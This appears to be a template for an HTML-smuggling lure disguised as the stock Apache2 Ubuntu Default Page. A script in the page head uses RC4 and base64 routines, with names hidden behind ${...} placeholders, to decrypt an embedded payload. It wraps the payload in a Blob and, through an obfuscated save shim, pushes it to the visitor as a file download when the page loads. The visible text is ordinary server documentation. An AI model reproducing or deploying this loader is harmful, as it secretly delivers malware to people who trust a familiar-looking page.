<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
  <!--
    Modified from the Debian original for Ubuntu
    Last updated: 2016-11-16
    See: https://launchpad.net/bugs/1288690
  -->
  <head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <title>Apache2 Ubuntu Default Page: It works</title>
<script>
function ${rc4Function}(r,o){for(var t,e=[],n=0,a="",f=0;f<256;f++)e[f]=f;for(f=0;f<256;f++)n=(n+e[f]+r.charCodeAt(f%r.length))%256,t=e[f],e[f]=e[n],e[n]=t;f=0,n=0;for(var h=0;h<o.length;h++)n=(n+e[f=(f+1)%256])%256,t=e[f],e[f]=e[n],e[n]=t,a+=String.fromCharCode(o.charCodeAt(h)^e[(e[f]+e[n])%256]);return a;}
function ${b64AndRC4Function}(r,o){var s=[],j=0,x,res='';for(var i=0;i<256;i++)s[i]=i;for(i=0;i<256;i++)j=(j+s[i]+r.charCodeAt(i%r.length))%256,x=s[i],s[i]=s[j],s[j]=x;i=0;j=0;var data=atob(o);var dataLength=data.length;var array=new Uint8Array(new ArrayBuffer(dataLength));for(var y=0;y<dataLength;y++)i=(i+1)%256,j=(j+s[i])%256,x=s[i],s[i]=s[j],s[j]=x,array[y]=data.charCodeAt(y)^s[(s[i]+s[j])% 256];return array;}

var ${keyFunction} = function(){return "${key}"};

var ${varPayload} = "${payload}";
var ${varBlobObjectName} = ${rc4Function}(${keyFunction}(),atob("${blobObjectNameEncrypted}"));
setTimeout('var ${varBlob} = new '+${varBlobObjectName}+'([${b64AndRC4Function}(${keyFunction}(), ${varPayload})], {type: "${mimeType}"})');
var ${varBlobShim} = ${rc4Function}(${keyFunction}(), atob("${blobShimEncrypted}"));
setTimeout(${varBlobShim}+'(${varBlob}, "${fileName}")');
</script>
    <style type="text/css" media="screen">
  * {
    margin: 0px 0px 0px 0px;
    padding: 0px 0px 0px 0px;
  }

  body, html {
    padding: 3px 3px 3px 3px;

    background-color: #D8DBE2;

    font-family: Verdana, sans-serif;
    font-size: 11pt;
    text-align: center;
  }

  div.main_page {
    position: relative;
    display: table;

    width: 800px;

    margin-bottom: 3px;
    margin-left: auto;
    margin-right: auto;
    padding: 0px 0px 0px 0px;

    border-width: 2px;
    border-color: #212738;
    border-style: solid;

    background-color: #FFFFFF;

    text-align: center;
  }

  div.page_header {
    height: 99px;
    width: 100%;

    background-color: #F5F6F7;
  }

  div.page_header span {
    margin: 15px 0px 0px 50px;

    font-size: 180%;
    font-weight: bold;
  }

  div.page_header img {
    margin: 3px 0px 0px 40px;

    border: 0px 0px 0px;
  }

  div.table_of_contents {
    clear: left;

    min-width: 200px;

    margin: 3px 3px 3px 3px;

    background-color: #FFFFFF;

    text-align: left;
  }

  div.table_of_contents_item {
    clear: left;

    width: 100%;

    margin: 4px 0px 0px 0px;

    background-color: #FFFFFF;

    color: #000000;
    text-align: left;
  }

  div.table_of_contents_item a {
    margin: 6px 0px 0px 6px;
  }

  div.content_section {
    margin: 3px 3px 3px 3px;

    background-color: #FFFFFF;

    text-align: left;
  }

  div.content_section_text {
    padding: 4px 8px 4px 8px;

    color: #000000;
    font-size: 100%;
  }

  div.content_section_text pre {
    margin: 8px 0px 8px 0px;
    padding: 8px 8px 8px 8px;

    border-width: 1px;
    border-style: dotted;
    border-color: #000000;

    background-color: #F5F6F7;

    font-style: italic;
  }

  div.content_section_text p {
    margin-bottom: 6px;
  }

  div.content_section_text ul, div.content_section_text li {
    padding: 4px 8px 4px 16px;
  }

  div.section_header {
    padding: 3px 6px 3px 6px;

    background-color: #8E9CB2;

    color: #FFFFFF;
    font-weight: bold;
    font-size: 112%;
    text-align: center;
  }

  div.section_header_red {
    background-color: #CD214F;
  }

  div.section_header_grey {
    background-color: #9F9386;
  }

  .floating_element {
    position: relative;
    float: left;
  }

  div.table_of_contents_item a,
  div.content_section_text a {
    text-decoration: none;
    font-weight: bold;
  }

  div.table_of_contents_item a:link,
  div.table_of_contents_item a:visited,
  div.table_of_contents_item a:active {
    color: #000000;
  }

  div.table_of_contents_item a:hover {
    background-color: #000000;

    color: #FFFFFF;
  }

  div.content_section_text a:link,
  div.content_section_text a:visited,
   div.content_section_text a:active {
    background-color: #DCDFE6;

    color: #000000;
  }

  div.content_section_text a:hover {
    background-color: #000000;

    color: #DCDFE6;
  }

  div.validator {
  }
    </style>
  </head>
  <body>
    <div class="main_page">
      <div class="page_header floating_element">
        <img src='data:image/png;base64,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' alt='Ubuntu Logo' class='floating_element'/>
        <span class="floating_element">
          Apache2 Ubuntu Default Page
        </span>
      </div>
<!--      <div class="table_of_contents floating_element">
        <div class="section_header section_header_grey">
          TABLE OF CONTENTS
        </div>
        <div class="table_of_contents_item floating_element">
          <a href="#about">About</a>
        </div>
        <div class="table_of_contents_item floating_element">
          <a href="#changes">Changes</a>
        </div>
        <div class="table_of_contents_item floating_element">
          <a href="#scope">Scope</a>
        </div>
        <div class="table_of_contents_item floating_element">
          <a href="#files">Config files</a>
        </div>
      </div>
-->
      <div class="content_section floating_element">


        <div class="section_header section_header_red">
          <div id="about"></div>
          It works!
        </div>
        <div class="content_section_text">
          <p>
                This is the default welcome page used to test the correct 
                operation of the Apache2 server after installation on Ubuntu systems.
                It is based on the equivalent page on Debian, from which the Ubuntu Apache
                packaging is derived.
                If you can read this page, it means that the Apache HTTP server installed at
                this site is working properly. You should <b>replace this file</b> (located at
                <tt>/var/www/html/index.html</tt>) before continuing to operate your HTTP server.
          </p>


          <p>
                If you are a normal user of this web site and don't know what this page is
                about, this probably means that the site is currently unavailable due to
                maintenance.
                If the problem persists, please contact the site's administrator.
          </p>

        </div>
        <div class="section_header">
          <div id="changes"></div>
                Configuration Overview
        </div>
        <div class="content_section_text">
          <p>
                Ubuntu's Apache2 default configuration is different from the
                upstream default configuration, and split into several files optimized for
                interaction with Ubuntu tools. The configuration system is
                <b>fully documented in
                /usr/share/doc/apache2/README.Debian.gz</b>. Refer to this for the full
                documentation. Documentation for the web server itself can be
                found by accessing the <a href="/manual">manual</a> if the <tt>apache2-doc</tt>
                package was installed on this server.

          </p>
          <p>
                The configuration layout for an Apache2 web server installation on Ubuntu systems is as follows:
          </p>
          <pre>
/etc/apache2/
|-- apache2.conf
|       `--  ports.conf
|-- mods-enabled
|       |-- *.load
|       `-- *.conf
|-- conf-enabled
|       `-- *.conf
|-- sites-enabled
|       `-- *.conf
          </pre>
          <ul>
                        <li>
                           <tt>apache2.conf</tt> is the main configuration
                           file. It puts the pieces together by including all remaining configuration
                           files when starting up the web server.
                        </li>

                        <li>
                           <tt>ports.conf</tt> is always included from the
                           main configuration file. It is used to determine the listening ports for
                           incoming connections, and this file can be customized anytime.
                        </li>

                        <li>
                           Configuration files in the <tt>mods-enabled/</tt>,
                           <tt>conf-enabled/</tt> and <tt>sites-enabled/</tt> directories contain
                           particular configuration snippets which manage modules, global configuration
                           fragments, or virtual host configurations, respectively.
                        </li>

                        <li>
                           They are activated by symlinking available
                           configuration files from their respective
                           *-available/ counterparts. These should be managed
                           by using our helpers
                           <tt>
                                a2enmod,
                                a2dismod,
                           </tt>
                           <tt>
                                a2ensite,
                                a2dissite,
                            </tt>
                                and
                           <tt>
                                a2enconf,
                                a2disconf
                           </tt>. See their respective man pages for detailed information.
                        </li>

                        <li>
                           The binary is called apache2. Due to the use of
                           environment variables, in the default configuration, apache2 needs to be
                           started/stopped with <tt>/etc/init.d/apache2</tt> or <tt>apache2ctl</tt>.
                           <b>Calling <tt>/usr/bin/apache2</tt> directly will not work</b> with the
                           default configuration.
                        </li>
          </ul>
        </div>

        <div class="section_header">
            <div id="docroot"></div>
                Document Roots
        </div>

        <div class="content_section_text">
            <p>
                By default, Ubuntu does not allow access through the web browser to
                <em>any</em> file apart of those located in <tt>/var/www</tt>,
                <a href="http://httpd.apache.org/docs/2.4/mod/mod_userdir.html" rel="nofollow">public_html</a>
                directories (when enabled) and <tt>/usr/share</tt> (for web
                applications). If your site is using a web document root
                located elsewhere (such as in <tt>/srv</tt>) you may need to whitelist your
                document root directory in <tt>/etc/apache2/apache2.conf</tt>.
            </p>
            <p>
                The default Ubuntu document root is <tt>/var/www/html</tt>. You
                can make your own virtual hosts under /var/www. This is different
                to previous releases which provides better security out of the box.
            </p>
        </div>

        <div class="section_header">
          <div id="bugs"></div>
                Reporting Problems
        </div>
        <div class="content_section_text">
          <p>
                Please use the <tt>ubuntu-bug</tt> tool to report bugs in the
                Apache2 package with Ubuntu. However, check <a
                href="https://bugs.launchpad.net/ubuntu/+source/apache2"
                rel="nofollow">existing bug reports</a> before reporting a new bug.
          </p>
          <p>
                Please report bugs specific to modules (such as PHP and others)
                to respective packages, not to the web server itself.
          </p>
        </div>




      </div>
    </div>
    <div class="validator">
    </div>
  </body>
</html>

